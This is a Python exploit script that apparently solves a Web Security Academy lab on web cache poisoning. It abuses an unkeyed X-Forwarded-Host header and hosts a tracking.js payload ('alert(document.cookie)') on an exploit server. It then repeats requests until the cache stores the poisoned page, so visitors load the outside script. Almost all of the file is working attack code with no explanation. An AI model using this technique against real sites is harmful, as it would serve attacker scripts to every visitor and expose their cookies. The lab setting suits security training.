import requests
from bs4 import BeautifulSoup
import time
import urllib3

site = '0acb001704decbe782d8385d007500b6.web-security-academy.net'
s = requests.Session()
site_url = f'https://{site}'
request_headers = {
   'X-Forwarded-Host' : f'lamlon.net'
}
resp = s.get(site_url, headers=request_headers)
if resp.headers['X-Cache'] == 'miss':
    soup = BeautifulSoup(resp.text,'html.parser')
    script_src = soup.find('script')
    print(f'Poisoned script tag is {script_src}')

resp = s.get(site_url)
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')
exploit_site = urllib3.util.parse_url(exploit_url).host 
exploit_html = 'alert(document.cookie)'

formData = {
   'urlIsHttps': 'on',
   'responseFile': '/resources/js/tracking.js',
   'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
   'responseBody': exploit_html,
   'formAction': 'STORE'
}
resp = s.post(exploit_url, data=formData)

request_headers = {
   'X-Forwarded-Host' : exploit_site
}
while True:
 resp = s.get(site_url, headers=request_headers)
 if resp.headers['X-Cache'] == 'miss':
       print(f'Poisoned (miss): {resp.headers}')
       break
 timeleft = 30 - int(resp.headers['Age'])
 print(f'Waiting {timeleft} to expire cache')
 time.sleep(timeleft)